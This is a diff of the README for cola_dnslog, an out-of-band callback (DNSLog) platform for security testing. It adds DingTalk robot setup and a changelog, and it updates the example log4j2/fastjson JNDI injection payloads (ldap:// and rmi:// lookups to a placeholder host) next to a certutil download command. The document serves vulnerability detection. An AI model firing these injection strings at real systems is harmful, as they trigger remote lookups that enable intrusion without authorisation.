@@ -1,7 +1,8 @@
 <div style="text-align:center;" width="100%">
-<img src="readme_resource/sugarless.png" alt="sugarless" width="250px" />
-<img src="readme_resource/dnslog.png" alt="dnslog" width="250px" />
+<img src="readme_resource/sugarless.png" alt="sugarless" width="45%" />
+<img src="readme_resource/dnslog.png" alt="dnslog" width="45%" />
 </div>
+
 
 
 英文版本在路上......
@@ -158,6 +159,28 @@ python3 -m http.server 18001
 
 玩得开心！
 
+### 钉钉机器人
+
+在钉钉群新建机器人，安全设置：添加自定义关键词`coladnslog`
+
+![image-20220731231424000](readme_resource/image-20220731231424000.png)
+
+并获取到webhook的token，注意，只需要填写token即可
+
+![image-20220731231912885](readme_resource/image-20220731231912885.png)
+
+进入webui，修改Dingtalk Robot Token为上文获取的token，点击Update保存即可
+
+![image-20220801003459410](readme_resource/image-20220801003459410.png)
+
+效果如下：
+
+<img src="readme_resource/image-20220731231301577.png" alt="image-20220731231301577" style="zoom:33%;" />
+
+### Bark
+
+==TODO==
+
 ### 如何使用
 
 上文提到，假定我的域名和ip是`example.com`和`1.1.1.1`，并且我们账户的logid为`qrq`
@@ -181,9 +204,11 @@ certutil -urlcache -split -f http://1.1.1.1/x x
 
 log4j2 fastjson等可以使用此方法
 
+注意这里必须要令最后路径的最后作为logid，如：`ldapqrq` `xxxxqrq` `qrq` `xxx/qrq`
+
 ```
-${jndi:ldap://1.1.1.1:1389/Exploit}
-{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://1.1.1.1:1389/Exploit", "autoCommit":true}
+${jndi:ldap://1.1.1.1:1389/ldapqrq}
+{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://1.1.1.1:1389/ldapqrq", "autoCommit":true}
 ```
 
 #### RMI
@@ -191,8 +216,8 @@ ${jndi:ldap://1.1.1.1:1389/Exploit}
 同上，log4j2 fastjson等
 
 ```
-${jndi:rmi://1.1.1.1:1099/Exploit}
-{ "b":{ "@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://1.1.1.1:1099/Exploit", "autoCommit":true } }
+${jndi:rmi://1.1.1.1:1099/rmiqrq}
+{ "b":{ "@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://1.1.1.1:1099/rmiqrq", "autoCommit":true } }
 ```
 
 ## 👀 概览
@@ -205,7 +230,7 @@ ${jndi:rmi://1.1.1.1:1099/Exploit}
 
 ### 首页
 
-![image-20220730151454295](readme_resource/image-20220730151454295.png)
+![image-20220731143149729](readme_resource/image-20220731143149729.png)
 
 
 
@@ -235,12 +260,31 @@ ${jndi:rmi://1.1.1.1:1099/Exploit}
 
 ### 账号信息
 
-![image-20220730152019445](readme_resource/image-20220730152019445.png)
+![image-20220801003540673](readme_resource/image-20220801003540673.png)
+
+
+
+### 钉钉机器人
+
+<img src="readme_resource/image-20220731231301577.png" alt="image-20220731231301577" style="zoom:33%;" />
+
+## 📔 更新日志
+
+- 2022-08-01 v1.1.0
+  1. 增加重新生成token、修改密码功能
+  2. 优化前端展示效果，优化渲染速度
+  3. 增加id排序功能
+  4. 首页Usage部分根据服务端自动生成
+  5. 增加钉钉机器人
+  6. 修复rmi协议解析bug
+
+- 2022-07-30 v1.0.0
+  1. cola_dnslog发布 v1.0.0
 
 ## 🎯 ==TODO==
 
-- [ ] 联动钉钉、bark
-- [ ] 前端的优化
+- [x] 联动钉钉【2022-07-31】 
+- [ ] 联动bark
 - [ ] docker一键部署
 - [ ] 其他协议
 
